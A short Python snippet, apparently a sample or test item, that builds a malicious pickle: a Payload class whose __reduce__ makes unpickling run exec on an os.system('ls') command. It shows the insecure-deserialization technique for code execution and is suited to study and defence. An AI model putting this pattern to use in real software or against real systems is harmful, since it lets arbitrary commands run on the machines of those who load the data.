import pickle

class Payload(object):
    def __reduce__(self):
        return (exec, ('import os;os.system("ls")', ))

def makePickleData():
    '''
    get data from Payload and pickle it before returning it
    '''
    return pickle.dumps(Payload())
